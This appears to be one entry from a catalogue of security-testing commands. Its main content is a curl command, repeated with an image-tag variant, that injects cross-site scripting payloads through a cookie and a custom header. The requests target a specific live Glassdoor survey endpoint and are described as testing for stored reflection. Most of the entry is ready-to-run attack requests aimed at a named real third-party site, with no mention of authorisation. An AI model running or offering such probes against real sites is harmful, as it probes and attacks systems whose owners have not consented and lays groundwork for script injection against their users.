---
id: cmd-curl-xss-cookie-header
data: >-
  curl -H "Cookie: vuln=\"<script>alert(1)</script>\"" -H "X-Custom:
  \"<script>alert(1)</script>\""
  "https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/" -v
tags:
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.691Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss-cookie-header

## Command

```bash
curl -H "Cookie: vuln=\"<script>alert(1)</script>\"" -H "X-Custom: \"<script>alert(1)</script>\"" "https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/" -v
```

## Description

Injects XSS payload into cookie and custom header to test stored reflection on survey endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Malicious cookie payload | Yes |
| `-H "X-Custom: ..."` | Custom header with payload | Yes |
| `-v` | Verbose mode | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: vuln=\"<script>alert(1)</script>\"" -H "X-Custom: \"<script>alert(1)</script>\"" "https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/" -v
```

### Advanced Usage

```bash
curl -H "Cookie: vuln=\"<img src=x onerror=alert(1)>\"" -H "X-Custom: \"<img src=x onerror=alert(1)>\"" "https://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/" -v
```

## Expected Output

Response shows stored payload in body or logs, encoded without execution.

## Related

- [[Related Procedure: Identify-Stored-XSS-in-Cookies-and-Headers]]
